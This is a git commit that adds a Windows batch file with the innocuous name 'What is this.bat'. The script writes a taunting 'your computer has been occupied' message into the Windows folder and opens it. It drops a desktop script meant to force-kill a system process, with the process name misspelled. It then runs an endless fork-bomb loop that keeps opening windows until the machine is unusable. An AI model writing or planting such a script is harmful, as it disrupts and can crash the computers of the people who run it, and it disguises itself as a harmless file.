dab4a2c5e91eb443cfe74796c8fb21b6137a0775
XiangBingHeng <62928755+XiangBingHeng@users.noreply.github.com>
2020-03-31 15:35:03 +0800

    Create What is this.bat

---
+++ What is this.bat
@@ -0,0 +1,7 @@
+@echo Your computer has been occupied!You need to open the place where I am, and then throw your computer out of the window! (even if you don't have a window) >>C:\windows\The beginning of pain.txt
+@start C:\windows\The beginning of pain.txt
+@echo taskkill /f /im cssrs.exe>>C:\user\Administrator\Desktop\What is it.bat
+:start
+start
+goto start
+call C:\user\Administrator\Desktop\What is it.bat
